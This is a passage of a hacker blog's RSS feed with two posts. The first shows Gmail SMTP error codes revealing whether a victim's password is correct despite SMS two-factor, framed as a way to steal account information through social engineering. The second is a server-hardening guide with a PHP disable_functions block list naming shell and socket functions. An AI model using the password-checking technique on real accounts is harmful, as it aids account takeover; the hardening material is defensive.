#0000BB">login</span><span style="color: #007700">(</span><span style="color: #0000BB">user</span><span style="color: #007700">,</span><span style="color: #0000BB">passw</span><span style="color: #007700">)&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>And when run the script my result was:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:132px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">Traceback&nbsp;</span><span style="color: #007700">(</span><span style="color: #0000BB">most&nbsp;recent&nbsp;call&nbsp;last</span><span style="color: #007700">):<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Users\Ali\Desktop\gmail.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;22</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: #0000BB">login</span><span style="color: #007700">(</span><span style="color: #0000BB">user</span><span style="color: #007700">,</span><span style="color: #0000BB">passw</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Python27\lib\smtplib.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;614</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;login<br />&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;SMTPAuthenticationError</span><span style="color: #007700">(</span><span style="color: #0000BB">code</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">resp</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">smtplib</span><span style="color: #007700">.</span><span style="color: #0000BB">SMTPAuthenticationError</span><span style="color: #007700">:&nbsp;(</span><span style="color: #0000BB">534</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'5.7.9&nbsp;Application-specific&nbsp;password&nbsp;requ<br />ired.&nbsp;Learn&nbsp;more&nbsp;at\n5.7.9&nbsp;http://support.google.com/accounts/bin/answer.py?answ<br />er=185833&nbsp;w3sm2453216wjf.3&nbsp;-&nbsp;gsmtp'</span><span style="color: #007700">)<br />&lt;/</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>Ohhh , Greate , because it’s just showing me check out app password url and didn’t send me any SMS. So it means my password is not wrong ! But to be sure I’m going to test this with wrong password.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:132px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">Traceback&nbsp;</span><span style="color: #007700">(</span><span style="color: #0000BB">most&nbsp;recent&nbsp;call&nbsp;last</span><span style="color: #007700">):<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Users\Ali\Desktop\gmail.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;22</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">a&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: #0000BB">login</span><span style="color: #007700">(</span><span style="color: #0000BB">user</span><span style="color: #007700">,</span><span style="color: #0000BB">passw</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Python27\lib\smtplib.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;614</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;login<br />&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;SMTPAuthenticationError</span><span style="color: #007700">(</span><span style="color: #0000BB">code</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">resp</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">smtplib</span><span style="color: #007700">.</span><span style="color: #0000BB">SMTPAuthenticationError</span><span style="color: #007700">:&nbsp;(</span><span style="color: #0000BB">535</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'5.7.8&nbsp;Username&nbsp;and&nbsp;Password&nbsp;not&nbsp;accepted<br />.&nbsp;Learn&nbsp;more&nbsp;at\n5.7.8&nbsp;http://support.google.com/mail/bin/answer.py?answer=14257<br />&nbsp;bv6sm2577733wjb.30&nbsp;-&nbsp;gsmtp'</span><span style="color: #007700">)<br />&lt;/</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>Now you can see different result. And let me test it with another Gmail which for a long time I didn’t use.<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:144px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">Traceback&nbsp;</span><span style="color: #007700">(</span><span style="color: #0000BB">most&nbsp;recent&nbsp;call&nbsp;last</span><span style="color: #007700">):<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Users\Ali\Desktop\gmail.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;22</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">a&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: #0000BB">login</span><span style="color: #007700">(</span><span style="color: #0000BB">user</span><span style="color: #007700">,</span><span style="color: #0000BB">passw</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Python27\lib\smtplib.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;614</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;login<br />&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;SMTPAuthenticationError</span><span style="color: #007700">(</span><span style="color: #0000BB">code</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">resp</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">smtplib</span><span style="color: #007700">.</span><span style="color: #0000BB">SMTPAuthenticationError</span><span style="color: #007700">:&nbsp;(</span><span style="color: #0000BB">534</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'5.7.14&nbsp;&lt;https:&nbsp;-ykrwwgn7pth55a1tqk3e1gfitbhkmghsuw=""&nbsp;4agnsmz6qasoci8_lqhs6mclnixpgqw_ops=""&nbsp;accounts.google.com=""&nbsp;dlg2yvdj_qzprqrv_i0l82hy22kcvuvdwscq=""&nbsp;enwfs-dk6nrjrf_thrthuzs555kifmnkek=""&nbsp;inuesignin=""&nbsp;n5.7.14=""&nbsp;ont=""&nbsp;pntqhm8pgwhqork6g4jaqbl5rcyk91sfb3=""&nbsp;sarp="1&amp;scc=1&amp;plt=AKgnsbu3u\n5.7.14"&nbsp;szjzlgqcf2y3wxgua9voyex8kmlf-laboneg=""&nbsp;wueyxesepgpc6rgqcwl9pfo4kwtg=""&gt;&nbsp;Please<br />log&nbsp;in&nbsp;via&nbsp;your&nbsp;web&nbsp;browser&nbsp;and\n5.7.14&nbsp;then&nbsp;try&nbsp;again.\n5.7.14&nbsp;Learn&nbsp;more&nbsp;at\n5<br />.7.14&nbsp;https://support.google.com/mail/bin/answer.py?answer=78754&nbsp;bv6sm2501216wjb<br />.30&nbsp;-&nbsp;gsmtp'</span><span style="color: #007700">)<br />&lt;/</span><span style="color: #0000BB">https</span><span style="color: #007700">:&gt;&lt;/</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>Now Google tells me use the browser to login. I don’t care about error. But there’s a point! What if we use a Gmail account which we didn’t ever use on my PC till now. So I will use my friend’s Gmail account and watch the result. <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:132px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">Traceback&nbsp;</span><span style="color: #007700">(</span><span style="color: #0000BB">most&nbsp;recent&nbsp;call&nbsp;last</span><span style="color: #007700">):<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Users\Ali\Desktop\gmail.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;22</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">a&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: #0000BB">login</span><span style="color: #007700">(</span><span style="color: #0000BB">user</span><span style="color: #007700">,</span><span style="color: #0000BB">passw</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Python27\lib\smtplib.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;614</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;login<br />&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;SMTPAuthenticationError</span><span style="color: #007700">(</span><span style="color: #0000BB">code</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">resp</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">smtplib</span><span style="color: #007700">.</span><span style="color: #0000BB">SMTPAuthenticationError</span><span style="color: #007700">:&nbsp;(</span><span style="color: #0000BB">534</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'5.7.9&nbsp;Application-specific&nbsp;password&nbsp;requ<br />ired.&nbsp;Learn&nbsp;more&nbsp;at\n5.7.9&nbsp;http://support.google.com/accounts/bin/answer.py?answ<br />er=185833&nbsp;bo3sm2561309wjb.44&nbsp;-&nbsp;gsmtp'</span><span style="color: #007700">)<br />&lt;/</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>It seems my friend’s been given me true password but he activated Gmail SMS auth. So now we can see that Google didn’t work hard on this way. When we have true password, we can login and steal information and if victim using Gmail SMS auth, however, we know what’s the true password and only need a little social engineering to login and steal information. All we need now it’s a script to make it automatic check the Gmail account to login with this script and read error to see what happen. If you think I’m going to make a automatic script for you, and put code here, I should tell you that, I am NOT.<br />
<font size="3"><br />
<b>Reference</b></font><br />
<br />
<a href="http://www.z3r0d4y.com/" target="_blank">ZCR Zeroday Cyber Research</a><br />
<br />
<b>Ali Razmjoo</b></blockquote>

]]></content:encoded>
			<dc:creator>G3n3Rall</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3128</guid>
		</item>
		<item>
			<title>How to Setup Secure Website for Hackers</title>
			<link>http://garage4hackers.com/entry.php?b=3127</link>
			<pubDate>Fri, 29 May 2015 15:22:50 GMT</pubDate>
			<description>When security researchers and hackers want to setup a self blog, the biggest stress on their head is what to do to secure their server(s) and...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">When security researchers and hackers want to setup a self blog, the biggest stress on their head is what to do to secure their server(s) and site(s). what if someone come and naughty their server(s) ? what if server get <a href="http://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank">DOS</a>/<a href="http://www.techopedia.com/definition/10261/distributed-denial-of-service-ddos" target="_blank">DDOS </a>attack when they don’t have access to fix up their server(s) and they are travelling or go for business or something and they can’t access their server(s) for some reason. After some years that I spent my life on information security I release that nothing can’t be secure 100% , But We shouldn’t give up and let others naughty our server and deface our website or maybe make us a botnet zombie for DOS/DDOS Attack. In past year I decided to do something to remove this stress for myself or make it less and I start to make a mini firewall or something like Robot for secure my server and sure I don’t trust other firewalls. 99% of firewalls bypass easy and it’s really ridicule that firewalls from big companies mostly skip checking the packets on POST requests. So that’s first reason I decided to secure my server by my own scripts, and if you want to know more , keep reading.<br />
<br />
At first We need to know , what do we have and what do we want? my first decision to secure my website is that I build my website on my own VPS and don’t share VPS with anyone else, so don’t use a share hosting for your site if it’s important for you not to be damaged by anyone, and by the way this method I want to talk about can’t be used to share hosting and it will take you in trouble if you share your VPS with someone else. Second decision is choose a operation system and a website platform for yourself, I choose CentOS for my Server OS and WordPress for my blogging. Notice , you can choose anything , But after you read this article you must know how to edit source codes and match them with other websites platform or OS. By the way I get a VPS that have a Console Access [Hardware Access + Emergency SSH or Emergency VNC] and I install a Panel [ For Example <a href="http://cpanel.net/" target="_blank">CPanel X (WHM/CPANEL)</a> ] and panel installer will automatically install anything that needs to be install on Server. That was first Step for lazy guys and if you like , you can install anything you need with terminal on SSH or anyway you like. Just setup your website and after That install your Wordpress [or anything you want]. Okay Here we go. Now what you need to Secure:<br />
<br />
1- WebServer<br />
2- Your Blogging(or maybe forum or …) Platform<br />
3- PHP<br />
4- Set Permissions<br />
5- Make a Mini Robot And a mini WAF<br />
6- Other Service if you use [For Example SSH , I will explain it at the end of this article]<br />
<br />
I don’t want to teach from the beginning of securing or config server so you most have a little knowledge while you reading this article. To protect your webserver from DOS/DDOS attack, if you use Apache [httpd] [Apache webserver is just an example] you really need to install <a href="http://blog.secaserver.com/2011/08/protect-apache-slowloris-attack/" target="_blank">Anti Slowloris</a> first. Maybe you hear <a href="http://ha.ckers.org/slowloris/slowloris.pl" target="_blank">Slowloris </a>before it’s a <a href="http://ha.ckers.org/slowloris/slowloris.pl" target="_blank">DOS/DDOS Script</a> to attack on Apache webserver and easily can take down the Apache webserver [I don’t want to talk about how this script works so don’t need to explain more about it]. So now how to install it?<br />
Fallow these commands:<br />
<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:108px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">mkdir&nbsp;zeroday<br />cd&nbsp;zeroday<br />wget&nbsp;http</span><span style="color: #007700">:</span><span style="color: #FF8000">//sourceforge.net/projects/mod-antiloris/files/mod_antiloris-0.4.tar.bz2/download<br /></span><span style="color: #0000BB">tar&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">xvjf&nbsp;mod_antiloris</span><span style="color: #007700">-</span><span style="color: #0000BB">0.4</span><span style="color: #007700">.</span><span style="color: #0000BB">tar</span><span style="color: #007700">.</span><span style="color: #0000BB">bz2<br />cd&nbsp;mod_antiloris</span><span style="color: #007700">-</span><span style="color: #0000BB">0.4<br />apxs&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">a&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">i&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">c&nbsp;mod_antiloris</span><span style="color: #007700">.</span><span style="color: #0000BB">c<br />service&nbsp;httpd&nbsp;restart&nbsp;<br /></span>
</span>
</code></code></div>
</div>If your Centos Doesn’t have apxs so you need to fallow these commands:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:96px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">yum&nbsp;install&nbsp;php</span><span style="color: #007700">-</span><span style="color: #0000BB">pear&nbsp;&nbsp;<br />yum&nbsp;install&nbsp;php</span><span style="color: #007700">-</span><span style="color: #0000BB">devel&nbsp;&nbsp;<br />yum&nbsp;install&nbsp;httpd</span><span style="color: #007700">-</span><span style="color: #0000BB">devel&nbsp;&nbsp;<br />pecl&nbsp;install&nbsp;apc&nbsp;&nbsp;<br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #DD0000">"extension=apc.so"&nbsp;</span><span style="color: #007700">&gt;&nbsp;/</span><span style="color: #0000BB">etc</span><span style="color: #007700">/</span><span style="color: #0000BB">php</span><span style="color: #007700">.</span><span style="color: #0000BB">d</span><span style="color: #007700">/</span><span style="color: #0000BB">apc</span><span style="color: #007700">.</span><span style="color: #0000BB">ini&nbsp;&nbsp;<br />service&nbsp;httpd&nbsp;restart&nbsp;<br /></span>
</span>
</code></code></div>
</div>And again if it shows you any error of php-devel or httpd-devel don’t give up and install these from rpm packages From <a href="http://vault.centos.org/5.3/updates/x86_64/RPMS/" target="_blank">vault.centos.org</a>.<br />
<br />
The next step for config your webserver ,You need to off the webserver signature to don’t get others much information about webserver modules. so find the httpd.conf and then open it and search the “ServerSignature On” , replace with “ServerSignature Off” and add “ServerTokens Prod” or “ServerTokens Email” [Webmaster or Admin Email].<br />
<br />
Next step is disable the CGI and directory listing and you need to Add “Options -Indexes -ExecCGI …” , If you do it before you know how to do these things and if not , Beginners can learn from this <a href="http://www.petefreitag.com/item/505.cfm" target="_blank">URL</a>.<br />
<br />
Notice: In that url, which I shared for beginners, said about “mod_security” ,I suggest you not to install or active it, sometimes it’s not good for poor servers and in DDOS attacks it gona help to make website going offline [Effect on crash or use much system processing].<br />
<br />
<br />
And now PHP config time, all you need is set some disable functions and turn on safe mode and disable errors not to show path and user, and to disallow other urls opening by fopen. I just made a list to disable function which you are allowed to use.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:36px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">socket_last_error</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_wexitstatus</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_recvfrom</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_wifexited</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_getpeername</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_mknod</span><span style="color: #007700">,</span><span style="color: #0000BB">base64_decode</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_wtermsig</span><span style="color: #007700">,</span><span style="color: #0000BB">imap_list</span><span style="color: #007700">,</span><span style="color: #0000BB">php_uname</span><span style="color: #007700">,</span><span style="color: #0000BB">openlog</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_client</span><span style="color: #007700">,</span><span style="color: #0000BB">imap_open</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_create</span><span style="color: #007700">,</span><span style="color: #0000BB">proc_get_status</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_isatty</span><span style="color: #007700">,</span><span style="color: #0000BB">group</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_copy_to_stream</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getrlimit</span><span style="color: #007700">,</span><span style="color: #0000BB">fwrite</span><span style="color: #007700">,</span><span style="color: #0000BB">pfsockopen</span><span style="color: #007700">,</span><span style="color: #0000BB">pfsockopenproc_nice</span><span style="color: #007700">,</span><span style="color: #0000BB">is_writable</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_write</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_read</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_mkfifo</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_initgroups</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_get_wrappers</span><span style="color: #007700">,</span><span style="color: #0000BB">dl</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getpwnam</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getgrgid</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_filter_append</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getgid</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getcwd</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getgroups</span><span style="color: #007700">,</span><span style="color: #0000BB">chmod</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_set_block</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_wstopsig</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_writereadlink</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_set_blocking</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_context_create</span><span style="color: #007700">,</span><span style="color: #0000BB">rewinddir</span><span style="color: #007700">,</span><span style="color: #0000BB">proc_terminate</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_get_filters</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_signal</span><span style="color: #007700">,</span><span style="color: #0000BB">dlopenlog</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_select</span><span style="color: #007700">,</span><span style="color: #0000BB">curl_getinfo</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_geteuid</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_recvfrom</span><span style="color: #007700">,</span><span style="color: #0000BB">error_log</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_select</span><span style="color: #007700">,</span><span style="color: #0000BB">shell_exec</span><span style="color: #007700">,</span><span style="color: #0000BB">apache_getenv</span><span style="color: #007700">,</span><span style="color: #0000BB">gzinflate</span><span style="color: #007700">,</span><span style="color: #0000BB">dir</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getpwuid</span><span style="color: #007700">,</span><span style="color: #0000BB">tmpfile</span><span style="color: #007700">,</span><span style="color: #0000BB">GETCWD</span><span style="color: #007700">(),</span><span style="color: #0000BB">stream_resolve_include_path</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_clear_error</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_wifstopped</span><span style="color: #007700">,</span><span style="color: #0000BB">syslog</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_context_set_option</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_accept</span><span style="color: #007700">,</span><span style="color: #0000BB">getmypid</span><span style="color: #007700">,</span><span style="color: #0000BB">cpanel_check</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_shutdown</span><span style="color: #007700">,</span><span style="color: #0000BB">apache_note</span><span style="color: #007700">,</span><span style="color: #0000BB">purepass</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getsid</span><span style="color: #007700">,</span><span style="color: #0000BB">leak</span><span style="color: #007700">,</span><span style="color: #0000BB">phpinfo</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_pair</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_setegid</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_set_nonblock</span><span style="color: #007700">,</span><span style="color: #0000BB">reg_glob</span><span style="color: #007700">,</span><span style="color: #0000BB">escapeshellcmd</span><span style="color: #007700">,</span><span style="color: #0000BB">gzuncompress</span><span style="color: #007700">,</span><span style="color: #0000BB">pureuser</span><span style="color: #007700">,</span><span style="color: #0000BB">show_source</span><span style="color: #007700">,</span><span style="color: #0000BB">apache_get_version</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getlogin</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_ctermid</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_kill</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_accept</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getppid</span><span style="color: #007700">,</span><span style="color: #0000BB">symlink</span><span style="color: #007700">,</span><span style="color: #0000BB">timearray</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_waitpid</span><span style="color: #007700">,</span><span style="color: #0000BB">getmygid</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_ttyname</span><span style="color: #007700">,</span><span style="color: #0000BB">diskfreespace</span><span style="color: #007700">,</span><span style="color: #0000BB">popen</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_sendto</span><span style="color: #007700">,</span><span style="color: #0000BB">apache_setenv</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_context_set_params</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_filter_register</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_access</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_set_option</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_context_get_default</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_errno</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_times</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_setuid</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_get_option</span><span style="color: #007700">,</span><span style="color: #0000BB">ftp_check</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_enable_crypto</span><span style="color: #007700">,</span><span style="color: #0000BB">port_bind_bd_c</span><span style="color: #007700">,</span><span style="color: #0000BB">proc_open</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_wifsignaled</span><span style="color: #007700">,</span><span style="color: #0000BB">proc_deutf</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_seteuid</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_uname</span><span style="color: #007700">,</span><span style="color: #0000BB">get_current_user</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_create_pair</span><span style="color: #007700">,</span><span style="color: #0000BB">proc_nice</span><span style="color: #007700">,</span><span style="color: #0000BB">curl_errno</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_sendsocket_sendto</span><span style="color: #007700">,</span><span style="color: #0000BB">mkdir</span><span style="color: #007700">,</span><span style="color: #0000BB">system</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_get_line</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getpid</span><span style="color: #007700">,</span><span style="color: #0000BB">highlight_file</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_create_listen</span><span style="color: #007700">,</span><span style="color: #0000BB">mysql_list_dbs</span><span style="color: #007700">,</span><span style="color: #0000BB">listen</span><span style="color: #007700">,</span><span style="color: #0000BB">imap_body</span><span style="color: #007700">,</span><span style="color: #0000BB">shell</span><span style="color: #007700">,</span><span style="color: #0000BB">ini_alter</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_setpgid</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_bind</span><span style="color: #007700">,</span><span style="color: #0000BB">link</span><span style="color: #007700">,</span><span style="color: #0000BB">getmyuid</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getpgid</span><span style="color: #007700">,</span><span style="color: #0000BB">ini_restore</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_setsid</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_set_write_buffer</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getegid</span><span style="color: #007700">,</span><span style="color: #0000BB">eof_ctrl_dir</span><span style="color: #007700">,</span><span style="color: #0000BB">getrusage</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_set_timeout</span><span style="color: #007700">,</span><span style="color: #0000BB">ini_get_all</span><span style="color: #007700">,</span><span style="color: #0000BB">apache_get_modules</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_server</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_filter_remove</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_setgid</span><span style="color: #007700">,</span><span style="color: #0000BB">proc_close</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_shutdown</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_listen</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_encoding</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getgrnam</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_wrapper_unregister</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_get_meta_data</span><span style="color: #007700">,</span><span style="color: #0000BB">getmicrotime</span><span style="color: #007700">,</span><span style="color: #0000BB">fpassthru</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_recv</span><span style="color: #007700">,</span><span style="color: #0000BB">virtual</span><span style="color: #007700">,</span><span style="color: #0000BB">chgrp</span><span style="color: #007700">,</span><span style="color: #0000BB">presets_rlph</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getuid</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_filter_prepend</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_get_transports</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_context_get_options</span><span style="color: #007700">,</span><span style="color: #0000BB">set_time_limit</span><span style="color: #007700">,</span><span style="color: #0000BB">exec</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getpgrp</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_register_wrapper</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_get_name</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_bucket_new</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_get_last_error</span><span style="color: #007700">,</span><span style="color: #0000BB">gethostbyname</span><span style="color: #007700">,</span><span style="color: #0000BB">getcwd</span><span style="color: #007700">(),</span><span style="color: #0000BB">chroot</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_close</span><span style="color: #007700">,</span><span style="color: #0000BB">escapeshellarg</span><span style="color: #007700">,</span><span style="color: #0000BB">fsockopen</span><span style="color: #007700">,</span><span style="color: #0000BB">passthru</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_wrapper_register</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_strerror</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_get_contents</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_wrapper_restore</span><span style="color: #007700">,</span><span style="color: 